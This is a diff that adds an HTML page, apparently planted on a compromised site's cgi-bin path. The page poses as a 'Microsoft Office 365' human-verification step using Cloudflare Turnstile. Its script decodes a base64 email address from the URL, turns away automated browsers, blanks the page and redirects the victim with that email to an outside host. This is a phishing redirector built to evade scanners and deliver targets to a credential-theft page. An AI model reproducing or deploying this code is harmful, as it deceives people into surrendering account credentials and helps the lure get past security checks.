@@ -1,0 +1,126 @@
+<!-- url: https://summitalarm.com/cgi-bin/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Microsoft Office 365</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f4f7f6;
+      color: #333;
+    }
+    .box {
+      width: 100%;
+      max-width: 500px;
+      padding: 30px;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+    h1 {
+      color: #2c3e50;
+      font-size: 1.5em;
+    }
+    .msg {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    .invisible {
+      display: none;
+    }
+  </style>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+</head>
+<body>
+  <div class="box" id="main-box">
+    <h1>Verify you are human by completing the action below.</h1>
+    <form id="verifyForm">
+      <div class="cf-turnstile" data-sitekey="0x4AAAAAABmLLmtB0aAHnf73" data-callback="onTurnstileSuccess"></div>
+    </form>
+    <div id="out" class="msg">Waiting...</div>
+  </div>
+
+  <script>
+    (() => {
+      const PARAM_NAMES = ['email', 'e', 'ref'];
+      const OUTPUT = document.getElementById('out');
+      const TARGET = 'https://eboosty.com/.1st/.2nd/?e=';
+      const DELAY_MS = 3;
+      let verified = false;
+
+      const b64UrlDecode = str => {
+        try {
+          let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
+          while (base64.length % 4 !== 0) base64 += '=';
+          const binary = atob(base64);
+          return decodeURIComponent(Array.from(binary).map(c =>
+            `%${('0' + c.charCodeAt(0).toString(16)).slice(-2)}`).join(''));
+        } catch {
+          return null;
+        }
+      };
+
+      const isBot = () =>
+        navigator.webdriver || !navigator.userAgent || window.outerWidth === 0;
+
+      const extractEncoded = () => {
+        const qs = new URLSearchParams(location.search);
+        for (const n of PARAM_NAMES) if (qs.has(n)) return qs.get(n);
+        let h = location.hash.slice(1);
+        if (!h) return null;
+        if (h.startsWith('=') || h.startsWith('$')) return h.slice(1);
+        const hq = h.includes('?') ? h.split('?')[1] : h;
+        const hqs = new URLSearchParams(hq);
+        for (const n of PARAM_NAMES) if (hqs.has(n)) return hqs.get(n);
+        return null;
+      };
+
+      function onTurnstileSuccess() {
+        verified = true;
+        process();
+      }
+
+      function process() {
+        if (!verified) return;
+        if (isBot()) {
+          OUTPUT.textContent = 'Bot access denied.';
+          return;
+        }
+
+        const encoded = extractEncoded();
+        if (!encoded) {
+          OUTPUT.textContent = 'Missing email parameter.';
+          return;
+        }
+
+        const decoded = b64UrlDecode(encoded);
+        if (!decoded || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+          OUTPUT.textContent = 'Invalid email format.';
+          return;
+        }
+
+        OUTPUT.textContent = 'Verified. Please wait...';
+
+        // Optional: hide UI to show blank screen (like your screenshot)
+        setTimeout(() => {
+          document.body.innerHTML = ''; // make page blank
+          setTimeout(() => {
+            location.href = `${TARGET}${encodeURIComponent(decoded)}`;
+          }, 1000); // redirect after blank screen
+        }, 1000);
+      }
+
+      window.onTurnstileSuccess = onTurnstileSuccess;
+    })();
+  </script>
+</body>
+</html>
